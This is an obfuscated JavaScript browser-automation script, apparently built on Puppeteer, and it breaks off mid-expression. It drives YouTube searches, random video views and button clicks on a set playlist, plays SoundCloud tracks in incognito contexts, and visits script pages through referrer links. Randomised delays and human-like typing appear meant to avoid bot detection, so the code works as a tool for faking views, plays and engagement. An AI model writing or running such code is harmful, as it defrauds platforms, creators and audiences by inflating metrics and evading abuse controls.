const V = d,
  U = c,
  T = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x14d + -0x492 * -0x7 + -0x214a))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x51a * -0x1 + -0xb77 + 0x1091), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xc1 * 0x36 + 0x11b6 + 0x8c30 + (-0x11 * 0x315 + -0x2aa * -0x11 + 0x41b3) * random()) : await standardWaitForNetIdle(f), await wait(0x1740 * -0x1 + -0x1 * -0x10c5 + -0x1a03 * -0x1 + (0x5b * -0x4 + -0x5 * -0x7a2 + 0x252) * random()), -0x228e + -0x1d15 * 0x1 + 0x1fd2 * 0x2;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x11ed * 0x1 + -0x4f * 0x76 + 0x2605 * 0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x18a9 * -0x1 + 0x923 + 0xf87;
}
async function randomWait() {
  return await wait(0x1ab1 + -0xa5e * 0x1 + 0x335 + (0x11aa + -0x19da + 0x8 * 0x377) * random()), -0x11 * 0x5c + 0x683 * 0x1 + -0x66;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x8 * -0x1c + -0x2065 + -0x1f85 * -0x1, -0x1aab + 0x20d4 + -0x622), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x3 * 0xd9f + 0x18c0 + 0xfa7d) * getRandomInt(-0x1e3 + -0x25b7 * 0x1 + -0xa9 * -0x3c, -0x3 * -0xa89 + 0x3df * -0xa + 0x720), h)), 0x3cb * -0x1 + -0x1221 + 0x15ed;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1bab + -0x1 * -0xde7 + 0xdc4);
    let h = e[f];
    if (b['EdrJkM'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x59d + -0x9e4 + -0x16d * -0x3, s, t, u = 0x8e7 * 0x3 + -0xa38 + -0x107d; t = n['charAt'](u++); ~t && (s = r % (0x14d + -0x492 * -0x7 + -0x2147) ? s * (0x51a * -0x1 + -0xb77 + 0x10d1) + t : t, r++ % (-0xc1 * 0x9 + 0x2f4 + 0x3d9)) ? p += String['fromCharCode'](-0x11 * 0x107 + -0xf19 * -0x1 + 0x35d & s >> (-(0x1740 * -0x1 + -0x1 * -0x10c5 + -0x97 * -0xb) * r & 0x5b * -0x2 + -0x5 * -0x3d1 + -0x1259)) : -0x228e + -0x1d15 * 0x1 + 0x3fa3 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x11ed * 0x1 + -0x4f * 0x76 + 0x127d * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x18a9 * -0x1 + 0x923 + 0xf96))['slice'](-(0x1ab1 + -0xa5e * 0x1 + -0x1051));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x11aa + -0x19da + 0x10 * 0x83,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x11 * 0x5c + 0x683 * 0x1 + -0x67; u < -0x8 * -0x1c + -0x2065 + -0xad7 * -0x3; u++) {
          p[u] = u;
        }
        for (u = -0x1aab + 0x20d4 + -0x629; u < -0x2 * 0x1b4 + 0x210 + 0x258; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1e3 + -0x25b7 * 0x1 + -0x144d * -0x2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x3 * -0xa89 + 0x3df * -0xa + 0x71b, q = 0x3cb * -0x1 + -0x1221 + 0x15ec;
        for (let v = -0x6c * 0x30 + -0xa49 * -0x3 + 0xa9b * -0x1; v < n['length']; v++) {
          u = (u + (-0xca1 * 0x3 + 0x262d + 0x1 * -0x49)) % (0x59d + 0x1085 * -0x2 + -0x1c6d * -0x1), q = (q + p[u]) % (-0x1d4 * 0x15 + -0x4a9 * 0x7 + -0xe67 * -0x5), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x3f9 * 0x7 + -0x35f * -0x1 + 0x16 * 0x128)]);
        }
        return t;
      };
      b['wBLQQo'] = m, c = arguments, b['EdrJkM'] = !![];
    }
    const j = e[0x21f6 + 0x36e + -0x2564],
      k = f + j,
      l = c[k];
    return !l ? (b['zHiGxa'] === undefined && (b['zHiGxa'] = !![]), h = b['wBLQQo'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x6c * 0x30 + -0xa49 * -0x3 + 0xa9b * -0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0xca1 * 0x3 + 0x262d + 0x1 * -0x49]['split']('\x20');
    for (let k = 0x59d + 0x1085 * -0x2 + -0x3eb * -0x7; k < i['length']; k += -0x1d4 * 0x15 + -0x4a9 * 0x7 + -0x4705 * -0x1)
      j += i[k] * h[i[k + (-0x3f9 * 0x7 + -0x35f * -0x1 + 0x1 * 0x1871)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x21f6 + 0x36e + -0x255e)['map'](l => Array['from'](l['children']))['flat'](-0x1cd4 + 0x4 * -0x565 + -0x1bd * -0x1d)['map'](l => l['childNodes'][0x199f + -0x15bb + -0x3e3 * 0x1]['childNodes'][0x1504 + 0x177b + -0x2c7f]['childNodes'][0xfc1 * -0x1 + -0x162e * -0x1 + -0x19b * 0x4]['childNodes'][0x10f3 * -0x1 + -0x1c * 0x116 + -0x543 * -0x9]['childNodes'][-0x420 + 0x9e6 * 0x1 + -0x7 * 0xd3]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x3ed * 0x4 + -0x10f5 * 0x2 + -0x12a * -0x13, 0x1ab9 + -0x98d + 0x25c)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1cb * -0x1a + -0xce9 + 0xabd * 0xb);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1 * 0x433c + -0xf62 * 0x1c + 0x158a * 0x22) * getRandomInt(-0x3bc + 0x7 * 0x24d + -0xc5d, 0x17b2 + -0x567 * 0x3 + -0x778), h);
  return await wait(i), -0x1 * 0x1375 + -0x184d + 0x2bc3;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x11b6 + -0x1 * 0x1715 + -0x3b * -0xb1]['children'][0x29d * 0x7 + 0x359 + 0x569 * -0x4]['children'][0x2cc + -0x26c6 * 0x1 + 0x5 * 0x732]['children'][-0x1 * 0xc0b + -0x4 * 0x1a5 + 0x129f]['children'][0x3e * 0x1d + 0x74f + -0xe55]['setAttribu' + 'te']('id', R(0x7));
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1337 + 0x193e + -0xb1d * 0x4;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xeb1 * 0x1 + 0x5bc * 0x6 + -0x1353 * 0x1 + (0x1 * -0x132b + -0x11a7 + 0x2504) * random()
  }), await wait(-0x1120 + -0x8c2 * 0x3 + 0x2d5a + (0x146 * -0xd + -0x17 * 0x139 + -0x2dd9 * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x19 * 0xc7 + 0xb21 + -0x2 * 0xf47]['childNodes'][-0x19a1 + 0x23c6 + -0xa24]['childNodes'][0x1e3c + -0x1ae4 + -0x357]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * 0x23e5 + 0x1c47 + 0x55 * 0x17]['childNodes'][0xa85 * 0x2 + -0xcbb * -0x3 + -0x101 * 0x3b]['childNodes'][-0x115f + 0x4 * -0x989 + 0x3785]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xdc3 + 0xe * -0xa3 + 0x16ae),
          r = 0x7c7 * 0x4 + 0x1aa * 0x8 + -0x2c6c;
        for (let u = 0xadb + -0x158 * 0xa + -0x295 * -0x1; u < q['length']; u += -0x5 * 0x610 + -0x37e + 0x21d0)
          r += q[u] * k[q[u + (-0x8 * -0x23a + -0x1ed9 * -0x1 + 0x18 * -0x207)]];
        return r;
      }(n);
  });
  await wait((-0xe5a * -0x7 + 0x2 * -0x25e2 + 0x21e6 * 0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x5eb * -0x32 + 0x3 * -0x4ab3 + 0x3 * 0x3631) * getRandomInt(0x245 * 0x1 + 0xe95 + -0x10d9, -0x1 * -0x1b59 + 0x8 * -0x392 + 0x141), h + (-0x118 + -0x348 * -0x6 + -0x1e * -0x8));
  return await wait(i), 0x19cd + -0x268d + 0xcc1;
}

function a() {
  const bh = [
    'CMCVzw4VC2nYAq',
    's3pdNgPDza',
    'rg/en/scri',
    'pts/424447',
    'WPFdKNSotCkcA8o1vmov',
    'lxnLCMLLCY10Aa',
    'BMrIB3GSBw9VBq',
    'gottemezez',
    'rmkixCovzdD+mmoEhG',
    'y2f0y2G',
    'qNjVD3nLCG',
    'qSoBcSkEW75nkbvjAG',
    'https://ww',
    'u1PqhghcHfpdKmoeuq',
    '%E9%A1%B5%',
    'BcXTB29TB28UAq',
    'mguZr1bLytfuEq',
    'mSkRW5D5aW',
    'BgLUAY1IExbHCW',
    'E7%B2%BE%E',
    'FeCYW48yrg/cN0RdPG',
    'zwfZEwzVCMSUBW',
    'AgfVCY1PBI1VDq',
    'digest',
    'BMnLzc1KyxrHlq',
    'W5CRW6ddULveWONcSmoMW5q',
    '.36'
  ];
  a = function() {
    return bh;
  };
  return a();
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x14b9 * -0x1 + -0x515 + -0xe * 0x11e), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1239 + 0x1 * -0x9d9 + 0x358 + (-0x4 * 0x1c9 + -0x1583 + 0x5 * 0x683) * Math['random']());
    });
  }, 0xe9 * 0x1f + -0xafc * -0x3 + -0x21d3);
  await wait(-0x313d8 + -0x3e488 + 0x1130 * 0xac);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x5 * -0x5973 + 0xf4e3 + -0x3 * 0x9896) * getRandomInt(-0x1408 * 0x1 + -0x1b50 + 0x1 * 0x2f5c, -0x3fb * -0x2 + 0x14 * 0x183 + -0x2619)), clearInterval(h), -0x141f + -0xc8d + -0x689 * -0x5;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0x195b + -0x1 * 0xea5 + -0xab6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x19b * -0x5 + 0x1 * -0xb33 + -0x223 * -0x9;
    await randomWait();
  }
  return -0x24f2 + -0x1554 + -0x3a47 * -0x1;
}

function fetchRandomSC() {
  return Math['random']() <= 0x12a * 0x17 + -0x28f * 0x5 + 0x4a9 * -0x3 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x2467 + -0x2c3 * 0x1 + -0x22d * -0x12 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1bab + -0x1 * -0xde7 + 0xdc4);
    let h = e[f];
    if (c['pkhQeH'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x59d + -0x9e4 + -0x16d * -0x3, r, s, t = 0x8e7 * 0x3 + -0xa38 + -0x107d; s = m['charAt'](t++); ~s && (r = q % (0x14d + -0x492 * -0x7 + -0x2147) ? r * (0x51a * -0x1 + -0xb77 + 0x10d1) + s : s, q++ % (-0xc1 * 0x9 + 0x2f4 + 0x3d9)) ? o += String['fromCharCode'](-0x11 * 0x107 + -0xf19 * -0x1 + 0x35d & r >> (-(0x1740 * -0x1 + -0x1 * -0x10c5 + -0x97 * -0xb) * q & 0x5b * -0x2 + -0x5 * -0x3d1 + -0x1259)) : -0x228e + -0x1d15 * 0x1 + 0x3fa3 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x11ed * 0x1 + -0x4f * 0x76 + 0x127d * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x18a9 * -0x1 + 0x923 + 0xf96))['slice'](-(0x1ab1 + -0xa5e * 0x1 + -0x1051));
        }
        return decodeURIComponent(p);
      };
      c['iekJCS'] = i, b = arguments, c['pkhQeH'] = !![];
    }
    const j = e[0x11aa + -0x19da + 0x10 * 0x83],
      k = f + j,
      l = b[k];
    return !l ? (h = c['iekJCS'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xca4 + -0x89c + 0x1540 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * 0x9ad + 0x1ff4 + 0x1 * -0x29a1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x11aab + -0x4a0b + -0x1 * -0x2147e + getRandomInt(0x2ba9 + 0x1 * 0x2a87 + -0x1b98, 0x1 * 0x74ef + -0x532 * 0x2b + 0xdfa7));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x39a * 0x3 + -0xe4 + 0x5 * 0x257), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x4 * 0xe3 + 0x1 * -0x14b5 + 0x1841 * 0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1174 * 0x2 + -0x2353 * -0x1 + -0x1 * 0x6b, 0x34 * -0x23 + -0x391 + 0x79 * 0x17)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x229c + 0x184d + -0x67 * 0x7f + floor((0x1307 * -0x1 + -0x24d1 + 0x3bc0) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3c48f5b0 + -0x493f54 * -0x23 + -0x223d6 * -0x534e),
          -0x1 * -0x4d464d + 0xe41132 + -0xb1577f,
          -0x9a3 * 0x16 + -0x1 * 0xf24d + 0x2464f,
          0x14f7 + 0x29e * -0xd + 0xd8f
        ], y = [
          -0x601 + 0x88 * -0x1 + 0x6a1,
          -0x13 * -0x1a + -0x1225 + 0x1047,
          -0xfe * 0xd + 0x1 * 0x3b + 0xcb3,
          -0xcf3 + -0xe8 * 0x4 + 0x1093
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x17c1 + -0x2124 + 0x38e6)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x11fa + -0x8a8 + -0x952; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const S = d;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')[S(0x17)]('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1 * -0x4 + 0x163c + -0x1640 * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x18fc + -0x898 + 0x2194] = A[-0x1f * -0x6a + -0x4f7 + -0x7cf] = A[0x1035 + -0x19ad + -0x1e5 * -0x5] = A[-0xf1 + -0xc * 0x232 + 0x1b4b] = A[0x4d * 0x3 + -0x125f + 0x1 * 0x117b] = A[-0x8e5 + 0x1838 + -0xf4f] = A[-0x135 + -0x1984 + 0x1abe] = A[0x1f7f * -0x1 + -0x1 * 0x177b + 0x5 * 0xb00] = A[0xf * -0xeb + 0x1 * -0x60f + -0xdd * -0x17] = A[-0x56b + 0x97d + -0x40a] = A[0x11 * -0x7f + 0x15f0 + -0xd78] = A[0x563 + -0x1 * -0x267b + -0x2bd4] = A[-0x1cf3 + -0xacb + 0x3 * 0xd43] = A[-0x3 * -0xa9b + 0x702 * -0x3 + -0x1 * 0xabf] = A[-0xcb + -0x4ed + 0x5c5] = A[0x1aff + 0x13a6 + -0x2e97] = A[0x39 * -0x29 + 0x2b * 0x31 + 0xf5] = -0xc3c + -0x128f * 0x1 + -0x1 * -0x1ecb, this['blocks'] = A) : this['blocks'] = [
                -0x90 + 0xa17 + -0x987,
                -0x12da + -0x6b5 + -0x2d7 * -0x9,
                0x1eeb + 0x1 * -0x7b6 + -0x1 * 0x1735,
                -0x891 + -0xc67 + 0x14f8,
                0x263 * -0xd + -0x94 * 0x2f + -0x1 * -0x3a33,
                0x1 * -0x29d + 0x417 * -0x7 + 0x1f3e,
                -0x9 * -0x375 + -0x1 * -0xd2d + 0x1 * -0x2c4a,
                -0xb70 + 0x1 * -0x1120 + 0x1c90,
                -0x9ed + -0x13 + 0x4 * 0x280,
                0x20f3 + 0x7 * -0x3cd + -0x658,
                -0x49b + -0x2318 + 0x27b3,
                0x2 * -0x22e + 0x1c0f + -0x17b3 * 0x1,
                0x22f3 + 0x3bd * -0x1 + -0x1f36,
                -0x589 * -0x7 + 0x83 * -0x7 + 0x7 * -0x506,
                -0x15 * -0x133 + 0x1c * -0x2b + -0x147b,
                0x10ae + -0xbbd * 0x2 + 0xae * 0xa,
                -0x25 * 0xd4 + 0x1 * 0x168b + 0x819
              ], this['h0'] = -0x3a7b0 * 0x623 + 0x41e28c0d + -0x7db * -0x79d4c, this['h1'] = 0x174d4b39a + 0x2c6fb29 * -0x4 + -0x79eb1b6d, this['h2'] = 0xb893dd * -0xe9 + -0xbcfe8237 * 0x1 + 0x1fdb7f35a, this['h3'] = 0x6d * -0x1afd1d + -0x8a04948 + 0x24506317, this['h4'] = 0x5 * 0x2ec2338c + 0x3c1bde67 * 0x6 + -0x18e9f5636, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x2278 + -0x1b02 + -0x776, this['finalized'] = this['hashed'] = -0x2097 + -0x246 * 0x8 + 0x32c7, this['first'] = -0x1a64 + 0x11b2 + 0x8b3;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x26d5 + 0x3e9 * 0x8 + 0x3 * -0x175f, O = J['length'] || -0x10b * 0x17 + 0x5 * 0x55d + -0x1 * 0x2d4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1bfa + -0x25f8 + -0x2 * -0x4ff, P[-0x3 * 0x98 + 0xe94 + -0xccc] = this['block'], P[0x1 * -0x122b + 0x4 * -0x7c7 + 0x3157 * 0x1] = P[-0xc1a + 0x1 * 0x9ae + 0x26d] = P[-0x1f97 + -0x8 * -0x2e5 + 0x871 * 0x1] = P[0x26b3 + -0x1ea6 * -0x1 + -0x4556] = P[-0xbd2 + -0x3ae * 0x1 + 0xf84] = P[0x2 * -0x69d + 0x1ed3 + -0x1194] = P[0x2441 + 0x50 * 0x3b + -0x36ab] = P[-0x15f * 0x1b + 0x77e * 0x2 + 0x1 * 0x1610] = P[0x4d * 0x26 + 0x5 * -0x7b4 + 0x1b1e] = P[0xb38 * 0x3 + -0xfa2 + -0x11fd] = P[0x14e * -0x7 + -0x1 * 0x1039 + 0x1965] = P[0x3 * 0xc2f + 0x213c + -0x45be] = P[-0x3ad + -0x11df + 0x4 * 0x566] = P[0x1 * -0x1175 + -0x11d0 * 0x1 + 0x2352] = P[-0x2117 + -0x31c + 0x2441] = P[0x9 * -0x22a + 0x15f7 + -0x26e] = 0x2444 + -0xf8a + -0x17b * 0xe), K) {
                    for (N = this['start']; M < O && N < 0x1421 * 0x1 + -0x38d + -0x1054; ++M)
                      P[N >> -0x1db + -0x1059 + 0x25 * 0x7e] |= J[M] << y[0x13 * 0x1 + -0x1 * 0x5d + 0x4d & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xa25 + 0x835 + -0x8c * -0x4; ++M)
                      (L = J['charCodeAt'](M)) < -0x10d3 + 0x1 * -0x169f + 0x27f2 ? P[N >> -0x61 * 0x2 + -0xab8 + 0xb7c] |= L << y[-0xa7b * 0x2 + -0xb * 0x379 + 0x4 * 0xecb & N++] : L < 0x1b12 + -0xc * -0xc3 + -0x1c36 ? (P[N >> -0x6 * 0x4b1 + 0x1 * -0x2110 + 0x3d38] |= (-0xc8b + 0x1b52 + -0x3 * 0x4ad | L >> -0x107 * -0x15 + -0x11 * 0x8e + -0xc1f) << y[0x204a + 0x34 * 0x35 + -0x2b0b & N++], P[N >> -0x7 * 0x3c1 + -0xb2 + -0x1 * -0x1afb] |= (-0x1cda + 0x24fa + -0x7a0 | -0x1261 + 0x23e3 * 0x1 + -0x1143 & L) << y[-0x1c5a + 0xb * 0x1ef + 0x718 & N++]) : L < 0x2e3 * 0x5d + -0x5aff * 0x4 + 0x3 * 0x67d7 || L >= -0x11d07 + 0xd307 * -0x2 + 0x3a315 * 0x1 ? (P[N >> -0xe2d + -0x6 * -0x646 + -0x1775 * 0x1] |= (0x1148 + -0x2432 + 0x95 * 0x22 | L >> 0x956 + 0x4f0 + -0xe3a) << y[-0x5ac * -0x3 + -0x1dfe + -0xaf * -0x13 & N++], P[N >> 0x2 * 0xe87 + -0x1022 + 0x1d * -0x72] |= (-0xb2 * -0x1f + 0x1645 + -0x1 * 0x2b53 | L >> -0x1769 + -0x27 * -0xd + -0xaba * -0x2 & 0x1598 + -0xe70 + -0x6e9) << y[-0x1 * -0x1459 + -0x13 * -0x1f1 + -0x1313 * 0x3 & N++], P[N >> 0x6b1 + -0x7b6 + 0x107 * 0x1] |= (0x42e + -0x208a + -0x2 * -0xe6e | -0x53 * 0x53 + 0x195b + 0x1cd & L) << y[0x191f + 0x1 * 0xa3f + -0x1 * 0x235b & N++]) : (L = 0x8 * -0x2ffb + -0x8473 + 0x3a9 * 0xd3 + ((0xbfb + 0x1b1b + -0x2317 & L) << -0x117 + 0x9 * 0x1f7 + -0xd * 0x146 | -0xe * -0x195 + 0x112b * -0x1 + -0xfc & J['charCodeAt'](++M)), P[N >> -0x22 * 0x95 + 0x1 * -0x21ef + 0x35bb] |= (0x174e + 0x812 + -0x10 * 0x1e7 | L >> -0x1767 * -0x1 + -0x649 * -0x3 + 0x1518 * -0x2) << 